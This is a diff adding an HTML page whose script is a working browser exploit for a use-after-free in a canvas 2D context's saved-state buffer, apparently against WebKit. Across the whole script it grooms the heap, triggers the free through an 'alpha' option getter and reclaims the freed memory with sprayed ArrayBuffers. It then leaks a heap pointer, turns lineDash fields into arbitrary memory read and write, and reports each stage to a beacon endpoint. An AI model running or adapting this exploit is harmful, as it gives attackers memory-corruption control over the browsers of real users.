@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V643</title></head>
+<body><pre id="out">V643 — corrected Portablelle (buf=6400, class=6656)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+
+var _imgs=[];
+for(var i=0;i<80;i++) _imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++%80];
+  img.src='/beacon/V643-'+tag+'?d='+encodeURIComponent(String(d).slice(0,900))+'&t='+Date.now();
+}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _b8b=new ArrayBuffer(8),_bu64;
+try{_bu64=new BigUint64Array(_b8b);}catch(e){}
+var _f64b=new Float64Array(_b8b);
+function f2h(v){_f64[0]=v;return ('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+function f2i(v){if(_bu64){_f64b[0]=v;return _bu64[0];}return null;}
+
+bk('BOOT','v643-corrected-portablelle');
+
+/* === KEY INSIGHT ===
+ * V627 CRASHED because it sprayed AB(4608) — WRONG SIZE CLASS.
+ * Vector<State,1> with 8 saves: expandCapacity → cap=max(16,...)=16
+ * Buffer = 16 * sizeof(State) = 16 * 400 = 6400 bytes
+ * libpas class = ceil(6400/512)*512 = 13*512 = 6656 bytes
+ *
+ * After destructor: m_stateStack.m_size=1, m_buffer=dangling→freed 6400B
+ * state[0] is the only readable entry (size=1 after resize in destructor)
+ * state[0].lineWidth @ buf+48, state[0].lineDash @ buf+168
+ */
+var NSAVES = 8;
+var STATE_SIZE = 400;
+var BUF_ALLOC = 6400;
+var LW_OFF = 48;
+var LD_BUF_OFF = 168;
+var LD_CAP_OFF = LD_BUF_OFF + 8;
+var LD_SIZE_OFF = LD_CAP_OFF + 4;
+var MARKER = 6.02214076e23;
+var SPRAY_N = 200;
+var GROOM_768 = 40;
+var GROOM_BUF = 40;
+
+bk('CFG','buf='+BUF_ALLOC+',lw='+LW_OFF+',ld='+LD_BUF_OFF+',spr='+SPRAY_N);
+
+/* PHASE 0: GROOM both size classes */
+var groomCanvases = [];
+var groomCtxs = [];
+for (var gi = 0; gi < GROOM_768; gi++) {
+  var gc = document.createElement('canvas');
+  gc.width = 1; gc.height = 1;
+  groomCtxs.push(gc.getContext('2d'));
+  groomCanvases.push(gc);
+}
+
+var groomABs = [];
+for (var gi2 = 0; gi2 < GROOM_BUF; gi2++) {
+  groomABs.push(new ArrayBuffer(BUF_ALLOC));
+}
+
+bk('GROOM','768='+groomCtxs.length+',buf='+groomABs.length);
+
+var abs = new Array(SPRAY_N);
+for (var _p = 0; _p < SPRAY_N; _p++) abs[_p] = 0;
+
+/* PHASE 1: UAF TRIGGER */
+var canvas = document.createElement('canvas');
+canvas.width = 1; canvas.height = 1;
+var innerCtx = null;
+var uafOpts = {};
+Object.defineProperty(uafOpts, 'alpha', { get: function() {
+  innerCtx = canvas.getContext('2d');
+  for (var i = 0; i < NSAVES; i++) innerCtx.save();
+  innerCtx.lineWidth = MARKER;
+  return true;
+}});
+
+canvas.getContext('bitmaprenderer', uafOpts);
+if (!innerCtx) { bk('DEAD','no-ctx'); throw 'dead'; }
+bk('UAF','ok');
+
+/* PHASE 2: FLUSH dealloc log */
+var flushJunk = [];
+for (var fi = 0; fi < 800; fi++) flushJunk.push(new ArrayBuffer(64));
+flushJunk = null;
+bk('FLUSH','ok');
+
+/* PHASE 3: SPRAY AB(6400) → reclaim freed stateStack buffer */
+for (var si = 0; si < SPRAY_N; si++) abs[si] = new ArrayBuffer(BUF_ALLOC);
+bk('SPRAY','n='+SPRAY_N);
+
+/* PHASE 4: READ lineWidth through dangling wrapper */
+var readLW = -999;
+try { readLW = innerCtx.lineWidth; } catch(e) { readLW = -888; }
+
+var readStatus;
+if (readLW === -888) readStatus = 'ERR';
+else if (readLW === -999) readStatus = 'NOREAD';
+else if (readLW === 0) readStatus = 'RECLAIMED';
+else if (readLW === 1) readStatus = 'DEFAULT';
+else if (Math.abs(readLW - MARKER) < 1e10) readStatus = 'STALE';
+else readStatus = 'OTHER:'+f2h(readLW);
+
+bk('R1', readStatus+'|'+readLW+'|'+f2h(readLW));
+say('R1: '+readStatus+' val='+readLW);
+
+if (readLW === -888 || readLW === -999) {
+  bk('ABORT','read-crashed');
+  setTimeout(function(){ location.reload(); }, 15000);
+  throw 'abort';
+}
+
+/* PHASE 5: WRITE marker + scan ABs */
+try { innerCtx.lineWidth = 1.717; } catch(e) { bk('W1-ERR',e.name); }
+bk('W1','written');
+
+var targetAB = null, targetIdx = -1, targetSlot = -1;
+var expectedSlot = LW_OFF / 8;
+for (var j = 0; j < SPRAY_N; j++) {
+  var fv = new Float64Array(abs[j]);
+  if (fv[expectedSlot] === 1.717) {
+    targetAB = abs[j]; targetIdx = j; targetSlot = expectedSlot;
+    break;
+  }
+  for (var k = 0; k < fv.length; k++) {
+    if (fv[k] === 1.717) {
+      targetAB = abs[j]; targetIdx = j; targetSlot = k;
+      break;
+    }
+  }
+  if (targetIdx >= 0) break;
+}
+
+bk('HIT', 'idx='+targetIdx+',slot='+targetSlot+',exp='+expectedSlot);
+say('HIT: AB['+targetIdx+'] slot='+targetSlot);
+
+if (targetIdx < 0) {
+  var nzc = 0;
+  for (var nz = 0; nz < SPRAY_N && nzc < 5; nz++) {
+    var nzv = new Float64Array(abs[nz]);
+    for (var nzk = 0; nzk < nzv.length; nzk++) {
+      if (nzv[nzk] !== 0) { nzc++; bk('NZ','ab='+nz+',k='+nzk+',v='+f2h(nzv[nzk])); break; }
+    }
+  }
+  bk('NOHIT','nz='+nzc);
+  bk('DONE','v643-nohit');
+  setTimeout(function(){ location.reload(); }, 15000);
+  throw 'nohit';
+}
+
+/* PHASE 6: HEAP LEAK via setLineDash */
+var heapLeak = 0n, heapLeakOK = 0;
+var targetDV = new DataView(targetAB);
+try {
+  innerCtx.setLineDash([1.0, 2.0, 3.0, 4.0]);
+  var lo = targetDV.getUint32(LD_BUF_OFF, true);
+  var hi = targetDV.getUint32(LD_BUF_OFF + 4, true);
+  heapLeak = BigInt(hi) * 0x100000000n + BigInt(lo);
+  heapLeakOK = (heapLeak > 0x10000n) ? 1 : 0;
+  var ldCap = targetDV.getUint32(LD_CAP_OFF, true);
+  var ldSize = targetDV.getUint32(LD_SIZE_OFF, true);
+  bk('LD-META', 'cap='+ldCap+',sz='+ldSize);
+} catch(e) { heapLeakOK = -1; bk('LD-ERR', e.name); }
+
+if (heapLeakOK === 1) {
+  bk('LEAK', '***PTR=0x'+heapLeak.toString(16)+'***');
+  say('*** HEAP LEAK: 0x'+heapLeak.toString(16)+' ***');
+} else {
+  bk('NOLEAK', 'st='+heapLeakOK+(heapLeak?',v=0x'+heapLeak.toString(16):''));
+  say('No leak ('+heapLeakOK+')');
+}
+
+/* PHASE 7: ARB READ verify — read back the lineDash buffer we just allocated */
+var arbReadOK = 0, arbReadVal = '';
+if (heapLeakOK === 1) {
+  try {
+    targetDV.setUint32(LD_BUF_OFF, Number(heapLeak & 0xFFFFFFFFn), true);
+    targetDV.setUint32(LD_BUF_OFF+4, Number((heapLeak>>32n) & 0xFFFFFFFFn), true);
+    targetDV.setUint32(LD_CAP_OFF, 4, true);
+    targetDV.setUint32(LD_SIZE_OFF, 4, true);
+    var rd = innerCtx.getLineDash();
+    if (rd && rd.length >= 1) {
+      arbReadOK = 1;
+      arbReadVal = rd.length+':';
+      for (var ri = 0; ri < Math.min(rd.length, 8); ri++)
+        arbReadVal += (ri?',':'')+rd[ri];
+    }
+  } catch(e) { arbReadOK = -1; bk('ARB-ERR', e.name); }
+}
+
+if (arbReadOK === 1) {
+  bk('ARB', '***READ='+arbReadVal+'***');
+  say('ARB READ: ['+arbReadVal+']');
+} else {
+  bk('NOARB', 'st='+arbReadOK);
+}
+
+/* PHASE 8: HEAP SCAN — scan backwards from leaked addr for vtable ptrs */
+var scanHits = [];
+if (arbReadOK === 1 && heapLeak > 0x10000n) {
+  try {
+    for (var sr = 0; sr < 8; sr++) {
+      var base = heapLeak - BigInt(sr * 4096);
+      if (base < 0n) continue;
+      targetDV.setUint32(LD_BUF_OFF, Number(base & 0xFFFFFFFFn), true);
+      targetDV.setUint32(LD_BUF_OFF+4, Number((base>>32n) & 0xFFFFFFFFn), true);
+      targetDV.setUint32(LD_CAP_OFF, 512, true);
+      targetDV.setUint32(LD_SIZE_OFF, 512, true);
+      var sc = innerCtx.getLineDash();
+      for (var si2 = 0; si2 < sc.length && scanHits.length < 24; si2++) {
+        var sv = f2i(sc[si2]);
+        if (sv !== null && sv > 0x400000n && sv < 0x800000000000n && (sv & 0x7n) === 0n) {
+          scanHits.push((base-heapLeak).toString()+'+'+si2+'=0x'+sv.toString(16));
+        }
+      }
+    }
+  } catch(e) { bk('SCAN-ERR', e.name); }
+}
+
+for (var ci = 0; ci < scanHits.length; ci += 4) {
+  bk('SCAN'+Math.floor(ci/4), scanHits.slice(ci, ci+4).join('|'));
+}
+if (scanHits.length === 0) bk('NOSCAN','n=0');
+say('Scan: '+scanHits.length+' ptrs');
+
+/* PHASE 9: ARB WRITE test */
+var arbWriteOK = 0;
+if (heapLeakOK === 1) {
+  try {
+    targetDV.setUint32(LD_BUF_OFF, Number(heapLeak & 0xFFFFFFFFn), true);
+    targetDV.setUint32(LD_BUF_OFF+4, Number((heapLeak>>32n) & 0xFFFFFFFFn), true);
+    targetDV.setUint32(LD_CAP_OFF, 8, true);
+    targetDV.setUint32(LD_SIZE_OFF, 0, true);
+    innerCtx.setLineDash([9.99, 8.88, 7.77, 6.66]);
+    var vd = innerCtx.getLineDash();
+    if (vd && vd.length === 8 && vd[0] === 9.99) arbWriteOK = 1;
+  } catch(e) { arbWriteOK = -1; bk('AW-ERR', e.name); }
+}
+bk('ARBW', 'ok='+arbWriteOK);
+
+/* Keep roots alive */
+canvas._gc = groomCanvases;
+canvas._gx = groomCtxs;
+canvas._ga = groomABs;
+canvas._abs = abs;
+
+bk('DONE','v643|leak='+heapLeakOK+'|arb='+arbReadOK+'|arbw='+arbWriteOK+'|scan='+scanHits.length);
+say('\nDONE leak='+heapLeakOK+' arb='+arbReadOK+' arbw='+arbWriteOK);
+setTimeout(function(){ location.reload(); }, 20000);
+</script>
+</body></html>
